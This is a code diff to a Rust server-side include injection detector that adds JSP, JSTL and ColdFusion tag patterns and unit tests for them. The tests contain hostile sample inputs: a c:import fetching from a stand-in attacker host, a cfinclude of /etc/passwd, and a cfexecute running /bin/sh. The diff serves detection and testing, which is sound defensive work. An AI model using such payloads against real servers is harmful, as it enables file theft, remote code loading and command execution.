@@ -29,6 +29,15 @@ const SSI_KEYWORDS: [(&[u8], &str); 12] = [
     (b"endif", "endif"),
 ];
 
+/// JSP / JSTL / ColdFusion server-side include/forward/execute tags.
+const JSP_PATTERNS: [(&[u8], &str); 5] = [
+    (b"<jsp:include",  "<jsp:include"),
+    (b"<jsp:forward",  "<jsp:forward"),
+    (b"<c:import",     "<c:import"),
+    (b"<cfinclude",    "<cfinclude"),
+    (b"<cfexecute",    "<cfexecute"),
+];
+
 fn starts_with_ci(hay: &[u8], pat: &[u8]) -> bool {
     hay.len() >= pat.len()
         && hay
@@ -48,6 +57,8 @@ fn skip_ascii_ws(bytes: &[u8], mut idx: usize) -> usize {
 impl SsiInjectionDfa {
     pub fn detect(&self, input: &str) -> Option<String> {
         let bytes = input.as_bytes();
+
+        // ── Apache / Nginx `<!--#` style ─────────────────────────────────────
         for idx in memchr_iter(b'<', bytes) {
             if bytes.len() < idx + 4 || &bytes[idx..idx + 4] != b"<!--" {
                 continue;
@@ -69,6 +80,21 @@ impl SsiInjectionDfa {
                 }
             }
         }
+
+        // ── JSP / JSTL / ColdFusion include/forward/execute tags ─────────────
+        for idx in memchr_iter(b'<', bytes) {
+            for (pat, label) in JSP_PATTERNS {
+                if bytes.len() >= idx + pat.len()
+                    && bytes[idx..idx + pat.len()]
+                        .iter()
+                        .zip(pat.iter())
+                        .all(|(a, b)| a.to_ascii_lowercase() == *b)
+                {
+                    return Some(label.to_string());
+                }
+            }
+        }
+
         None
     }
 }
@@ -98,6 +124,36 @@ mod tests {
         assert_eq!(
             dfa.detect("<!--#PRINTENV -->").as_deref(),
             Some("<!--#printenv")
+        );
+    }
+
+    #[test]
+    fn detects_jsp_jstl_coldfusion_include_patterns() {
+        let dfa = SsiInjectionDfaBuilder::new().build();
+
+        assert_eq!(
+            dfa.detect("<jsp:include page=\"/admin/config\" />")
+                .as_deref(),
+            Some("<jsp:include")
+        );
+        assert_eq!(
+            dfa.detect("<jsp:forward page=\"/internal\" />").as_deref(),
+            Some("<jsp:forward")
+        );
+        assert_eq!(
+            dfa.detect("<c:import url=\"http://attacker.test/payload\" />")
+                .as_deref(),
+            Some("<c:import")
+        );
+        assert_eq!(
+            dfa.detect("<cfinclude template=\"/etc/passwd\" />")
+                .as_deref(),
+            Some("<cfinclude")
+        );
+        assert_eq!(
+            dfa.detect("<cfexecute name=\"/bin/sh\" arguments=\"-c id\" />")
+                .as_deref(),
+            Some("<cfexecute")
         );
     }
 }
